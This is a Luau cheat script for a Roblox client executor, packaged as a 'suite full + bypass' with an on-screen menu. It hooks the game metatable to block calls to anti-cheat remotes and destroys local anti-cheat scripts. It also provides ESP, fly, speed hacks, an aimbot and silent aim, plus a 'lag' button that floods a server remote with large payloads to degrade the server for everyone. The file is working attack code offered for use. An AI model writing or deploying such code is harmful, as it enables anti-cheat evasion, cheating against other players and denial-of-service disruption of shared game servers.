--!strict
--!native
-- language: Luau, file: suite_full_bypass.luau, target: Roblox client executor (Delta, mobile OK)
-- Bypass AC client → fly → walkspeed → aimbot → silent aim → lag SetPlayerBlockList.
-- Anti-cheat serveur = hors de portée. Anti-cheat client = neutralisé.

local Players           = game:GetService("Players")
local RunService        = game:GetService("RunService")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local NetworkClient     = game:GetService("NetworkClient")
local TweenService      = game:GetService("TweenService")
local Camera            = workspace.CurrentCamera
local LP                = Players.LocalPlayer
local PG                = LP:WaitForChild("PlayerGui")

-- ═══════════════════════════════════════════════════════════════════════════
-- 0. ANTI-CHEAT BYPASS (client-side only)
-- ═══════════════════════════════════════════════════════════════════════════

local neutralized: {[Instance]: boolean} = {}
local AC_KEYWORDS = {
    "detect", "report", "flag", "kick", "ban", "anticheat", "ac",
    "memer", "violation", "cheat", "suspect", "punish", "guard", "monitor",
}

local function isSuspect(name: string): boolean
    local n = name:lower()
    for _, kw in ipairs(AC_KEYWORDS) do
        if string.find(n, kw, 1, true) then return true end
    end
    return false
end

local function neutralize(remote: Instance)
    if neutralized[remote] then return end
    neutralized[remote] = true
    if not remote:IsA("RemoteEvent") then return end
    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(self, ...)
        if getnamecallmethod() == "FireServer" and self == remote then
            return nil
        end
        return old(self, ...)
    end)
    setreadonly(mt, true)
end

local function scanAndNeutralize()
    for _, d in ipairs(ReplicatedStorage:GetDescendants()) do
        if (d:IsA("RemoteEvent") or d:IsA("RemoteFunction")) and isSuspect(d.Name) then
            neutralize(d)
        end
    end
    local char = LP.Character
    if char then
        for _, d in ipairs(char:GetDescendants()) do
            if d:IsA("RemoteEvent") then neutralize(d) end
        end
    end
end

local function killLocalAC()
    local function scan(parent: Instance)
        for _, c in ipairs(parent:GetChildren()) do
            if (c:IsA("LocalScript") or c:IsA("Script")) and isSuspect(c.Name) then
                pcall(function() c.Disabled = true end)
                pcall(function() c:Destroy() end)
            end
            if c:IsA("Folder") or c:IsA("Model") then scan(c) end
        end
    end
    local char = LP.Character
    if char then scan(char) end
    local ps = LP:FindFirstChild("PlayerScripts")
    if ps then scan(ps) end
end

local function runBypass(char: Model?)
    task.wait(0.5)
    scanAndNeutralize()
    killLocalAC()
    if char then
        char.DescendantAdded:Connect(function(d)
            if d:IsA("RemoteEvent") then task.wait(0.1); neutralize(d) end
        end)
    end
end

ReplicatedStorage.DescendantAdded:Connect(function(d)
    if (d:IsA("RemoteEvent") or d:IsA("RemoteFunction")) and isSuspect(d.Name) then
        task.wait(0.1); neutralize(d)
    end
end)

if LP.Character then runBypass(LP.Character) end
LP.CharacterAdded:Connect(runBypass)

-- ═══════════════════════════════════════════════════════════════════════════
-- CONFIG
-- ═══════════════════════════════════════════════════════════════════════════

local CFG = {
    esp = true, esp_color = Color3.fromRGB(255, 60, 60),
    fly = false, fly_speed = 60, fly_key = Enum.KeyCode.F4,
    ws_enabled = false, ws_value = 60, ws_key = Enum.KeyCode.F5,
    aim = true, aim_fov = 200, aim_smooth = 0.12, aim_part = "Head",
    aim_hold = Enum.UserInputType.MouseButton2, aim_toggle = Enum.KeyCode.F2,
    silent = true, silent_fov = 250, silent_part = "Head", silent_key = Enum.KeyCode.F6,
    lag_size = 50000, lag_burst = 5, lag_delay = 0.05,
}

local function corner(p: Instance, r: number)
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, r); c.Parent = p
end
local function getChar(): Model? return LP.Character end
local function getHRP(): BasePart?
    local c = getChar(); if not c then return nil end
    return c:FindFirstChild("HumanoidRootPart") :: BasePart?
end
local function getHum(): Humanoid?
    local c = getChar(); if not c then return nil end
    return c:FindFirstChildOfClass("Humanoid")
end

-- ═══════════════════════════════════════════════════════════════════════════
-- ESP
-- ═══════════════════════════════════════════════════════════════════════════

local eg = Instance.new("ScreenGui")
eg.Name = "Combat"; eg.ResetOnSpawn = false
eg.IgnoreGuiInset = true; eg.DisplayOrder = 100; eg.Parent = PG

type Entry = { box: Frame, name: TextLabel, health: Frame }
local entries: {[Player]: Entry} = {}

local function mkEntry(): Entry
    local box = Instance.new("Frame")
    box.BackgroundTransparency = 1; box.BorderSizePixel = 0
    local s = Instance.new("UIStroke"); s.Color = CFG.esp_color; s.Thickness = 1.5; s.Parent = box
    local name = Instance.new("TextLabel")
    name.Size = UDim2.new(1, 0, 0, 14); name.Position = UDim2.fromOffset(0, -16)
    name.BackgroundTransparency = 1; name.TextColor3 = CFG.esp_color
    name.TextSize = 12; name.Font = Enum.Font.GothamBold
    name.TextStrokeTransparency = 0.4; name.Text = ""; name.Parent = box
    local health = Instance.new("Frame")
    health.Size = UDim2.new(0, 3, 1, 0); health.Position = UDim2.new(-1, -6, 0, 0)
    health.BackgroundColor3 = Color3.fromRGB(0, 220, 80)
    health.BorderSizePixel = 0; health.Parent = box
    return { box = box, name = name, health = health }
end

local function attach(p: Player)
    if entries[p] then return end
    local e = mkEntry(); e.box.Parent = eg; entries[p] = e
end
for _, p in ipairs(Players:GetPlayers()) do attach(p) end
Players.PlayerAdded:Connect(attach)
Players.PlayerRemoving:Connect(function(p)
    local e = entries[p]; if e then e.box:Destroy(); entries[p] = nil end
end)

local function valid(p: Player): boolean
    if p == LP then return false end
    local c = p.Character; if not c then return false end
    local h = c:FindFirstChildOfClass("Humanoid")
    if not h or h.Health <= 0 then return false end
    if p.Team and LP.Team and p.Team == LP.Team then return false end
    return true
end

local function project(c: Model): (Vector2?, Vector2?)
    local hrp = c:FindFirstChild("HumanoidRootPart") :: BasePart?
    if not hrp then return nil, nil end
    local t, onT = Camera:WorldToViewportPoint(hrp.Position + Vector3.new(0, hrp.Size.Y/2 + 1.1, 0))
    local b, onB = Camera:WorldToViewportPoint(hrp.Position - Vector3.new(0, hrp.Size.Y/2, 0))
    if not (onT and onB) or t.Z <= 0 or b.Z <= 0 then return nil, nil end
    local h = math.abs(b.Y - t.Y); local w = h * 0.6
    return Vector2.new(t.X - w/2, t.Y), Vector2.new(w, h)
end

RunService.RenderStepped:Connect(function()
    for p, e in pairs(entries) do
        if not CFG.esp or not valid(p) then e.box.Visible = false; continue end
        local tl, sz = project(p.Character :: Model)
        if not tl or not sz then e.box.Visible = false; continue end
        e.box.Visible = true
        e.box.Position = UDim2.fromOffset(tl.X, tl.Y)
        e.box.Size = UDim2.fromOffset(sz.X, sz.Y)
        e.name.Text = p.Name
        local h = (p.Character :: Model):FindFirstChildOfClass("Humanoid")
        if h then
            local r = math.clamp(h.Health / math.max(h.MaxHealth, 1), 0, 1)
            e.health.Size = UDim2.new(0, 3, r, 0)
            e.health.Position = UDim2.new(-1, -6, 1 - r, 0)
        end
    end
end)

-- ═══════════════════════════════════════════════════════════════════════════
-- FLY
-- ═══════════════════════════════════════════════════════════════════════════

local flyVel: BodyVelocity? = nil
local flyGyro: BodyGyro? = nil
local flyConn: RBXScriptConnection? = nil

local function stopFly()
    CFG.fly = false
    if flyVel then flyVel:Destroy(); flyVel = nil end
    if flyGyro then flyGyro:Destroy(); flyGyro = nil end
    if flyConn then flyConn:Disconnect(); flyConn = nil end
end

local function startFly()
    local hrp = getHRP(); if not hrp then return end
    CFG.fly = true
    flyVel = Instance.new("BodyVelocity")
    flyVel.MaxForce = Vector3.new(1e9, 1e9, 1e9)
    flyVel.Velocity = Vector3.zero; flyVel.Parent = hrp
    flyGyro = Instance.new("BodyGyro")
    flyGyro.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
    flyGyro.P = 1000; flyGyro.CFrame = hrp.CFrame; flyGyro.Parent = hrp
    flyConn = RunService.RenderStepped:Connect(function()
        if not CFG.fly then return end
        local h = getHRP(); if not h or not flyVel or not flyGyro then return end
        flyVel.Velocity = Camera.CFrame.LookVector * CFG.fly_speed
        flyGyro.CFrame = Camera.CFrame
    end)
end

local function toggleFly() if CFG.fly then stopFly() else startFly() end end

-- ═══════════════════════════════════════════════════════════════════════════
-- WALKSPEED
-- ═══════════════════════════════════════════════════════════════════════════

local wsConn: RBXScriptConnection? = nil

local function startWs()
    CFG.ws_enabled = true
    local h = getHum(); if h then h.WalkSpeed = CFG.ws_value end
    wsConn = RunService.Heartbeat:Connect(function()
        if not CFG.ws_enabled then return end
        local hh = getHum(); if hh then hh.WalkSpeed = CFG.ws_value end
    end)
end

local function stopWs()
    CFG.ws_enabled = false
    if wsConn then wsConn:Disconnect(); wsConn = nil end
    local h = getHum(); if h then h.WalkSpeed = 16 end
end

-- ═══════════════════════════════════════════════════════════════════════════
-- CIBLE COMMUNE
-- ═══════════════════════════════════════════════════════════════════════════

local function nearestInFov(fov: number, part: string): BasePart?
    local center = Camera.ViewportSize / 2
    local bestD = fov; local best: BasePart? = nil
    for _, p in ipairs(Players:GetPlayers()) do
        if not valid(p) then continue end
        local c = p.Character :: Model
        local pp = c:FindFirstChild(part) :: BasePart?
            or c:FindFirstChild("HumanoidRootPart") :: BasePart?
        if not pp then continue end
        local sp, on = Camera:WorldToViewportPoint(pp.Position)
        if not on or sp.Z <= 0 then continue end
        local d = (Vector2.new(sp.X, sp.Y) - center).Magnitude
        if d < bestD then bestD = d; best = pp end
    end
    return best
end

-- ═══════════════════════════════════════════════════════════════════════════
-- AIMBOT
-- ═══════════════════════════════════════════════════════════════════════════

local holding = false; local aimOn = CFG.aim
UserInputService.InputBegan:Connect(function(i, proc)
    if proc then return end
    if i.UserInputType == CFG.aim_hold then holding = true end
    if i.KeyCode == CFG.aim_toggle then aimOn = not aimOn end
end)
UserInputService.InputEnded:Connect(function(i)
    if i.UserInputType == CFG.aim_hold then holding = false end
end)

RunService.RenderStepped:Connect(function()
    if not (aimOn and holding) then return end
    local tp = nearestInFov(CFG.aim_fov, CFG.aim_part)
    if not tp then return end
    local cp = Camera.CFrame.Position
    local des = CFrame.lookAt(cp, tp.Position)
    local t = 1 - CFG.aim_smooth
    local cur = Camera.CFrame
    local np = cur.Position:Lerp(des.Position, t)
    Camera.CFrame = CFrame.lookAt(np, np + cur.LookVector:Lerp(des.LookVector, t).Unit)
end)

-- ═══════════════════════════════════════════════════════════════════════════
-- SILENT AIM
-- ═══════════════════════════════════════════════════════════════════════════

local function fireAtTarget(part: BasePart)
    for _, d in ipairs(ReplicatedStorage:GetDescendants()) do
        if d:IsA("RemoteEvent") then
            local n = d.Name:lower()
            if string.find(n, "fire") or string.find(n, "shoot") or string.find(n, "attack") then
                pcall(function() d:FireServer(part.Position) end)
                pcall(function() d:FireServer(part) end)
                pcall(function() d:FireServer(part.Position, part) end)
            end
        end
    end
end

local silentOn = CFG.silent
UserInputService.InputBegan:Connect(function(i, proc)
    if proc then return end
    if i.KeyCode == CFG.silent_key then silentOn = not silentOn end
end)

RunService.RenderStepped:Connect(function()
    if not silentOn then return end
    if not UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then return end
    local tp = nearestInFov(CFG.silent_fov, CFG.silent_part)
    if not tp then return end
    fireAtTarget(tp)
end)

-- ═══════════════════════════════════════════════════════════════════════════
-- LAG SERVEUR (SetPlayerBlockList)
-- ═══════════════════════════════════════════════════════════════════════════

local function resolveBlock(): any?
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
        return r
    end
    return nil
end

local lag = { running = false, thread = nil :: thread?, remote = nil :: any }

local function stopLag()
    lag.running = false
    if lag.thread then task.cancel(lag.thread); lag.thread = nil end
end

local function startLag(): boolean
    local r = resolveBlock(); if not r then return false end
    lag.remote = r; lag.running = true
    pcall(function() NetworkClient:SetOutgoingKBPSLimit(2^31 - 1) end)
    local payload = string.rep("A", CFG.lag_size)
    lag.thread = task.spawn(function()
        while lag.running do
            for _ = 1, CFG.lag_burst do
                pcall(function() r:FireServer(payload) end)
                pcall(function() r:FireServer(payload, payload, true) end)
            end
            task.wait(CFG.lag_delay)
        end
    end)
    return true
end

-- ═══════════════════════════════════════════════════════════════════════════
-- TOUCHES GLOBALES
-- ═══════════════════════════════════════════════════════════════════════════

UserInputService.InputBegan:Connect(function(i, proc)
    if proc then return end
    if i.KeyCode == CFG.fly_key then toggleFly() end
    if i.KeyCode == CFG.ws_key then
        if CFG.ws_enabled then stopWs() else startWs() end
    end
end)

-- ═══════════════════════════════════════════════════════════════════════════
-- GUI
-- ═══════════════════════════════════════════════════════════════════════════

local sg = Instance.new("ScreenGui")
sg.Name = "Suite"; sg.ResetOnSpawn = false
sg.IgnoreGuiInset = true; sg.DisplayOrder = 999; sg.Parent = PG

local root = Instance.new("Frame")
root.Size = UDim2.fromScale(0.94, 0.88); root.Position = UDim2.fromScale(0.03, 0.06)
root.BackgroundColor3 = Color3.fromRGB(18, 18, 20)
root.BorderSizePixel = 0; root.Active = true; root.Parent = sg
corner(root, 12)
local rs = Instance.new("UIStroke"); rs.Color = Color3.fromRGB(60, 60, 68); rs.Thickness = 1; rs.Parent = root

local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 42); titleBar.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
titleBar.BorderSizePixel = 0; titleBar.Parent = root; corner(titleBar, 12)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -120, 1, 0); title.Position = UDim2.fromOffset(12, 0)
title.BackgroundTransparency = 1; title.TextColor3 = Color3.fromRGB(230, 230, 235)
title.TextSize = 15; title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left; title.Text = "SUITE FULL + BYPASS"; title.Parent = titleBar

local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.fromOffset(40, 30); minBtn.Position = UDim2.new(1, -48, 0, 6)
minBtn.BackgroundColor3 = Color3.fromRGB(48, 48, 54); minBtn.TextColor3 = Color3.fromRGB(220, 220, 225)
minBtn.TextSize = 18; minBtn.Font = Enum.Font.GothamBold; minBtn.Text = "—"; minBtn.Parent = titleBar
corner(minBtn, 6)

local body = Instance.new("Frame")
body.Size = UDim2.new(1, 0, 1, -42); body.Position = UDim2.fromOffset(0, 42)
body.BackgroundTransparency = 1; body.Parent = root

local minimized = false
minBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    local sz = minimized and UDim2.new(1, 0, 0, 42) or UDim2.fromScale(0.94, 0.88)
    TweenService:Create(root, TweenInfo.new(0.2), {Size = sz}):Play()
    body.Visible = not minimized; minBtn.Text = minimized and "+" or "—"
end)

local dragging = false; local dragStart: Vector2? = nil; local startPos: UDim2? = nil
titleBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.Touch
        or i.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true; dragStart = i.Position; startPos = root.Position
        i.Changed:Connect(function()
            if i.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
UserInputService.InputChanged:Connect(function(i)
    if dragging and dragStart and startPos and (
        i.UserInputType == Enum.UserInputType.Touch
        or i.UserInputType == Enum.UserInputType.MouseMovement) then
        local d = i.Position - dragStart
        root.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X,
                                  startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)

local tabBar = Instance.new("Frame")
tabBar.Size = UDim2.new(1, -12, 0, 32); tabBar.Position = UDim2.fromOffset(6, 6)
tabBar.BackgroundTransparency = 1; tabBar.Parent = body
local tl = Instance.new("UIListLayout")
tl.FillDirection = Enum.FillDirection.Horizontal; tl.Padding = UDim.new(0, 4); tl.Parent = tabBar

local pages: {[string]: ScrollingFrame} = {}
local tabBtns: {[string]: TextButton} = {}
local function newTab(name: string, idx: number)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0, 0, 1, 0); b.AutomaticSize = Enum.AutomaticSize.X
    b.BackgroundColor3 = Color3.fromRGB(40, 40, 46); b.TextColor3 = Color3.fromRGB(200, 200, 208)
    b.TextSize = 11; b.Font = Enum.Font.GothamBold; b.Text = name
    b.LayoutOrder = idx; b.Parent = tabBar; corner(b, 6); tabBtns[name] = b
    local page = Instance.new("ScrollingFrame")
    page.Size = UDim2.new(1, -12, 1, -48); page.Position = UDim2.fromOffset(6, 42)
    page.BackgroundTransparency = 1; page.BorderSizePixel = 0; page.ScrollBarThickness = 4
    page.CanvasSize = UDim2.new(0, 0, 0, 0); page.AutomaticCanvasSize = Enum.AutomaticSize.Y
    page.Visible = false; page.Parent = body; pages[name] = page
    local lay = Instance.new("UIListLayout")
    lay.Padding = UDim.new(0, 6); lay.SortOrder = Enum.SortOrder.LayoutOrder; lay.Parent = page
    b.MouseButton1Click:Connect(function()
        for n, p in pairs(pages) do p.Visible = (n == name) end
        for n, bb in pairs(tabBtns) do
            bb.BackgroundColor3 = (n == name) and Color3.fromRGB(70, 130, 220) or Color3.fromRGB(40, 40, 46)
        end
    end)
end
newTab("Combat", 1); newTab("Move", 2); newTab("Lag", 3); newTab("AC", 4)
pages["Combat"].Visible = true
tabBtns["Combat"].BackgroundColor3 = Color3.fromRGB(70, 130, 220)

local function toggleRow(parent: ScrollingFrame, label: string, key: string, cb: (() -> ())?)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, -4, 0, 40); f.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
    f.BorderSizePixel = 0; f.Parent = parent; corner(f, 6)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -70, 1, 0); l.Position = UDim2.fromOffset(10, 0)
    l.BackgroundTransparency = 1; l.TextColor3 = Color3.fromRGB(220, 220, 228)
    l.TextSize = 13; l.Font = Enum.Font.Gotham; l.TextXAlignment = Enum.TextXAlignment.Left
    l.Text = label; l.Parent = f
    local b = Instance.new("TextButton")
    b.Size = UDim2.fromOffset(56, 30); b.Position = UDim2.new(1, -64, 0, 5)
    b.Text = (CFG :: any)[key] and "ON" or "OFF"
    b.BackgroundColor3 = (CFG :: any)[key] and Color3.fromRGB(50, 160, 90) or Color3.fromRGB(70, 50, 50)
    b.TextColor3 = Color3.fromRGB(240, 240, 240); b.TextSize = 12
    b.Font = Enum.Font.GothamBold; b.Parent = f; corner(b, 6)
    b.MouseButton1Click:Connect(function()
        (CFG :: any)[key] = not (CFG :: any)[key]
        b.Text = (CFG :: any)[key] and "ON" or "OFF"
        b.BackgroundColor3 = (CFG :: any)[key] and Color3.fromRGB(50, 160, 90) or Color3.fromRGB(70, 50, 50)
        if cb then cb() end
    end)
end

local function sliderRow(parent: ScrollingFrame, label: string, min: number, max: number,
                          key: string, fmt: string)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, -4, 0, 56); f.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
    f.BorderSizePixel = 0; f.Parent = parent; corner(f, 6)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(1, -20, 0, 20); l.Position = UDim2.fromOffset(10, 2)
    l.BackgroundTransparency = 1; l.TextColor3 = Color3.fromRGB(210, 210, 220)
    l.TextSize = 12; l.Font = Enum.Font.Gotham; l.TextXAlignment = Enum.TextXAlignment.Left
    l.Text = label .. ": " .. string.format(fmt, (CFG :: any)[key]); l.Parent = f
    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(1, -20, 0, 14); bar.Position = UDim2.fromOffset(10, 28)
    bar.BackgroundColor3 = Color3.fromRGB(46, 46, 52); bar.BorderSizePixel = 0
    bar.Parent = f; corner(bar, 4)
    local fill = Instance.new("Frame")
    local rel0 = ((CFG :: any)[key] - min) / (max - min)
    fill.Size = UDim2.fromScale(rel0, 1); fill.BackgroundColor3 = Color3.fromRGB(70, 130, 220)
    fill.BorderSizePixel = 0; fill.Parent = bar; corner(fill, 4)
    local dr = false
    local function setX(x: number)
        local r = math.clamp((x - bar.AbsolutePosition.X) / math.max(bar.AbsoluteSize.X, 1), 0, 1)
        fill.Size = UDim2.fromScale(r, 1)
        local v = min + (max - min) * r
        (CFG :: any)[key] = v
        l.Text = label .. ": " .. string.format(fmt, v)
    end
    bar.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.Touch
            or i.UserInputType == Enum.UserInputType.MouseButton1 then
            dr = true; setX(i.Position.X)
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dr and (i.UserInputType == Enum.UserInputType.Touch
            or i.UserInputType == Enum.UserInputType.MouseMovement) then
            setX(i.Position.X)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.Touch
            or i.UserInputType == Enum.UserInputType.MouseButton1 then dr = false end
    end)
end

local function actionBtn(parent: ScrollingFrame, text: string, color: Color3, cb: () -> ())
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -4, 0, 40); b.BackgroundColor3 = color
    b.TextColor3 = Color3.fromRGB(240, 240, 240); b.TextSize = 13
    b.Font = Enum.Font.GothamBold; b.Text = text; b.Parent = parent; corner(b, 6)
    b.MouseButton1Click:Connect(cb)
end

toggleRow(pages["Combat"], "ESP", "esp")
toggleRow(pages["Combat"], "Aimbot (hold RMB / F2)", "aim")
sliderRow(pages["Combat"], "Aim FOV", 20, 500, "aim_fov", "%.0fpx")
sliderRow(pages["Combat"], "Aim smooth", 0, 0.9, "aim_smooth", "%.2f")
toggleRow(pages["Combat"], "Silent aim (F6)", "silent")
sliderRow(pages["Combat"], "Silent FOV", 50, 600, "silent_fov", "%.0fpx")

toggleRow(pages["Move"], "Fly (F4)", "fly", function()
    if CFG.fly then startFly() else stopFly() end
end)
sliderRow(pages["Move"], "Fly speed", 10, 300, "fly_speed", "%.0f")
toggleRow(pages["Move"], "Walkspeed (F5)", "ws_enabled", function()
    if CFG.ws_enabled then startWs() else stopWs() end
end)
sliderRow(pages["Move"], "Walkspeed value", 16, 300, "ws_value", "%.0f")

local lagStatus = Instance.new("TextLabel")
lagStatus.Size = UDim2.new(1, -8, 0, 22); lagStatus.BackgroundTransparency = 1
lagStatus.TextColor3 = Color3.fromRGB(160, 160, 168); lagStatus.TextSize = 12
lagStatus.Font = Enum.Font.Gotham; lagStatus.TextXAlignment = Enum.TextXAlignment.Left
lagStatus.Text = "SetPlayerBlockList"; lagStatus.Parent = pages["Lag"]

sliderRow(pages["Lag"], "Payload size", 5000, 200000, "lag_size", "%.0f")
sliderRow(pages["Lag"], "Burst", 1, 20, "lag_burst", "%.0f")
sliderRow(pages["Lag"], "Delay", 0.01, 0.3, "lag_delay", "%.2fs")
actionBtn(pages["Lag"], "START LAG", Color3.fromRGB(140, 50, 50), function()
    if startLag() then lagStatus.Text = "flooding" else lagStatus.Text = "remote introuvable" end
end)
actionBtn(pages["Lag"], "STOP", Color3.fromRGB(80, 80, 90), function()
    stopLag(); lagStatus.Text = "stopped"
end)

local acStatus = Instance.new("TextLabel")
acStatus.Size = UDim2.new(1, -8, 0, 40); acStatus.BackgroundTransparency = 1
acStatus.TextColor3 = Color3.fromRGB(160, 160, 168); acStatus.TextSize = 12
acStatus.Font = Enum.Font.Gotham; acStatus.TextXAlignment = Enum.TextXAlignment.Left
acStatus.TextWrapped = true
acStatus.Text = "bypass actif — remotes neutralisés: " .. tostring(#neutralized)
acStatus.Parent = pages["AC"]

actionBtn(pages["AC"], "RE-SCAN + NEUTRALIZE", Color3.fromRGB(60, 60, 70), function()
    scanAndNeutralize(); killLocalAC()
    acStatus.Text = "re-scan — remotes neutralisés: " .. tostring(#neutralized)
end)
actionBtn(pages["AC"], "KILL LOCAL AC SCRIPTS", Color3.fromRGB(70, 60, 100), function()
    killLocalAC(); acStatus.Text = "local AC scripts destroyed"
end)
